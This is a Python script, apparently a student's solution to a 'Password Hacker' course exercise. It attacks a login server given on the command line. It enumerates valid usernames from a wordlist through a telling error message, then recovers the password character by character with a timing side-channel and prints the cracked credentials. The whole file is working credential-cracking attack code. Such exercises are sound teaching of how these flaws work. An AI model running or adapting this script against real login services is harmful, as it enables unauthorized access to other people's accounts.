import socket
import sys
import string
import copy
from itertools import product
import json
from datetime import datetime
import logging

try:
    HOST = sys.argv[1] #first input
    PORT = int(sys.argv[2]) #second input
except IndexError:
    HOST = 'localhost'
    PORT = 9090

password_file_path = '/home/nick/PycharmProjects/Password Hacker with Python/Password Hacker with Python/task/hacking/passwords.txt'
login_file_path = r'C:\Users\snick\PycharmProjects\Password Hacker with Python\Password Hacker with Python\task\hacking\logins.txt'
symbols = string.ascii_lowercase+string.ascii_uppercase+'1234567890'

# def case_permutations(word):
#     lu_sequence = []
#     for char in word:
#         if char.isdigit():
#             lu_sequence.append(char)
#         else:
#             lu_sequence.append((char.lower(), char.upper()))
#     return [''.join(comb) for comb in product(*lu_sequence)]

def getDataFromFile(path):
    with open(path, 'r') as file:
        data_list = []
        for line in file:
            data_list.append(line.strip())
        return data_list

with (socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket):

    logging.basicConfig(filename='delta_time.log', level=logging.INFO)
    server_address = (HOST, PORT)
    new_socket.connect(server_address)
    login_list = getDataFromFile(login_file_path)
    true_login = ''
    for login in login_list:
        query = {'login': str(login), 'password':''}
        query = json.dumps(query)
        encoded_query = query.encode('utf-8')
        new_socket.send(encoded_query)
        response = new_socket.recv(1024)
        response = response.decode('utf-8')
        response = json.loads(response)

        if response["result"] == 'Wrong password!':
            true_login = login
            break

    #now we can bruteforce the password
    # outer loop for every next symbol of the password
    # loop for every next char to try for the current symbol

    # algorithm: use timeit to measure the difference, then use it with time module.
    # in case if I use time or datetime I only can some logs to separate file (cuz I can not debug the common way)
    break_outer = False
    incomlete_pswd = ''

    while True: #->do while
        for char in symbols:
            query = {'login': str(true_login), 'password': str(incomlete_pswd+char)}
            query = json.dumps(query)
            encoded_query = query.encode('utf-8')
            start_time = datetime.now()
            new_socket.send(encoded_query)
            response = new_socket.recv(1024)
            end_time = datetime.now()
            time_delta = (end_time - start_time).total_seconds()
            logging.info(str(time_delta) + ' seconds elapsed')
            response = response.decode('utf-8')
            response = json.loads(response)

            if response['result'] == "Connection success!":
                break_outer = True
                break

            if time_delta > 0.1: # % of prev time
                incomlete_pswd += char
                break

        if break_outer:
            break

    print(query) # correct login-password pair
    new_socket.close()